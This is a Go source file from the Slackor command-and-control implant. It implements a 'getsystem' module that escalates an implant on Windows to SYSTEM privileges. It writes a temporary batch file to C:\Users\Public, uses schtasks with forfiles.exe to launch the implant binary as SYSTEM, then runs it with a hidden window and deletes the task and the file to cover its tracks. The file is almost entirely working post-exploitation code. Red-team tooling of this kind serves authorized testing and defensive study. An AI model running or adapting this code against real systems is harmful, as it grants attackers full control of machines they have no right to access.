// +build windows

package windows

import (
	"math/rand"
	"os"
	"os/exec"
	"syscall"

	"github.com/Coalfire-Research/Slackor/pkg/command"
)

func randomString(len int) string { //Creates a random string of uppercase letters
	bytes := make([]byte, len)
	for i := 0; i < len; i++ {
		bytes[i] = byte(65 + rand.Intn(25)) //A=65 and Z = 65+25
	}
	return string(bytes)
}

// GetSystem uses task scheduler to execute the binary as SYSTEM
type GetSystem struct{}

// Name is the name of the command
func (g GetSystem) Name() string {
	return "getsystem"
}

// Run uses task scheduler to execute the binary as SYSTEM
func (g GetSystem) Run(clientID string, jobID string, args []string) (string, error) {
	taskname := randomString(6)
	task1 := "schtasks /create /TN " + taskname + " /TR \"forfiles.exe /p c:\\windows\\system32 /m svchost.exe /c " + os.Args[0] + " \" /SC DAILY /RU system /F"
	task2 := "schtasks /run /I /tn " + taskname
	task3 := "schtasks /delete /TN " + taskname + " /f"
	//Creates a bat file
	GS, err := os.Create("C:\\Users\\Public\\build.bat")
	if err != nil {
		return "", err
	}
	GS.WriteString(string(task1) + "\r\n")
	GS.WriteString(string(task2) + "\r\n")
	GS.WriteString(string(task3) + "\r\n")
	GS.Close()
	Exec := exec.Command("cmd", "/C", "C:\\Users\\Public\\build.bat")
	Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err = Exec.Run()
	if err != nil {
		return "", err
	}
	err = os.Remove("C:\\Users\\Public\\build.bat")
	if err != nil {
		return "", err
	}

	return "Attempted to get SYSTEM", nil
}

func init() {
	command.RegisterCommand(GetSystem{})
}
